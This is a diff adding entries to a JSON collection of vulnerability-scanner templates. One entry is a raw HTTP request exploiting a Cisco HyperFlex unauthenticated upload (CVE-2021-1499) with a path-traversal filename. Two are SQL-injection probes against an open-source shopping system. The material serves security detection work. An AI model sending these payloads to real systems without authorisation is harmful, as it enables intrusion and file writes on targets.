@@ -29146,6 +29146,58 @@
       ]
     },
     {
+      "id": "CVE-2021-1499",
+      "info": {
+        "author": "gy741",
+        "classification": {
+          "cve-id": "CVE-2021-1499",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "cvss-score": 5.3,
+          "cwe-id": "CWE-306"
+        },
+        "description": "A vulnerability in the web-based management interface of Cisco HyperFlex HX Data Platform could allow an unauthenticated, remote attacker to upload files to an affected device. This vulnerability is due to missing authentication for the upload function. An attacker could exploit this vulnerability by sending a specific HTTP request to an affected device. A successful exploit could allow the attacker to upload files to the affected device with the permissions of the tomcat8 user.",
+        "name": "Cisco HyperFlex HX Data Platform - File Upload Vulnerability",
+        "reference": [
+          "https://swarm.ptsecurity.com/cisco-hyperflex-how-we-got-rce-through-login-form-and-other-findings/",
+          "https://nvd.nist.gov/vuln/detail/CVE-2021-1499"
+        ],
+        "severity": "medium",
+        "tags": "cve,cve2021,cisco,fileupload,intrusive"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "application/json"
+              ]
+            },
+            {
+              "condition": "and",
+              "type": "word",
+              "words": [
+                "{\"result\":",
+                "\"filename:",
+                "/tmp/passwd9"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /upload HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nAccept-Encoding: gzip, deflate\nContent-Type: multipart/form-data; boundary=---------------------------253855577425106594691130420583\nOrigin: {{RootURL}}\nReferer: {{RootURL}}\n\n-----------------------------253855577425106594691130420583\nContent-Disposition: form-data; name=\"file\"; filename=\"../../../../../tmp/passwd9\"\nContent-Type: application/json\n\nMyPasswdNewData->/api/tomcat\n\n-----------------------------253855577425106594691130420583--\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-20090",
       "info": {
         "author": "gy741",
@@ -35308,7 +35360,8 @@
         "name": "Redux Framework - Unauthenticated Sensitive Information Disclosure",
         "reference": [
           "https://www.wordfence.com/blog/2021/09/over-1-million-sites-affected-by-redux-framework-vulnerabilities/",
-          "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-38314"
+          "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-38314",
+          "https://blog.sorcery.ie/posts/redux_wordpress/"
         ],
         "severity": "medium",
         "tags": "cve,cve2021,wordpress,wp-plugin"
@@ -35842,6 +35895,96 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/.//WEB-INF/classes/META-INF/microprofile-config.properties"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-41648",
+      "info": {
+        "author": "daffainfo",
+        "description": "An un-authenticated SQL Injection exists in PuneethReddyHC online-shopping-system-advanced through the /action.php prId parameter. Using a post request does not sanitize the user input.",
+        "name": "PuneethReddyHC online-shopping-system-advanced SQL Injection action.php",
+        "reference": "https://github.com/MobiusBinary/CVE-2021-41648",
+        "severity": "high",
+        "tags": "cve,cve2021,sqli"
+      },
+      "requests": [
+        {
+          "body": "proId=1'&addToCart=1",
+          "matchers": [
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "Warning: mysqli_num_rows() expects parameter 1 to be",
+                "xdebug-error xe-warning"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/action.php"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-41649",
+      "info": {
+        "author": "daffainfo",
+        "description": "An un-authenticated SQL Injection exists in PuneethReddyHC online-shopping-system-advanced through the /homeaction.php cat_id parameter. Using a post request does not sanitize the user input.",
+        "name": "PuneethReddyHC online-shopping-system-advanced SQL Injection homeaction.php",
+        "reference": "https://github.com/MobiusBinary/CVE-2021-41649",
+        "severity": "high",
+        "tags": "cve,cve2021,sqli"
+      },
+      "requests": [
+        {
+          "body": "cat_id=4'&get_seleted_Category=1",
+          "matchers": [
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "Warning: mysqli_num_rows() expects parameter 1 to be",
+                "xdebug-error xe-warning"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/homeaction.php"
           ]
         }
       ]
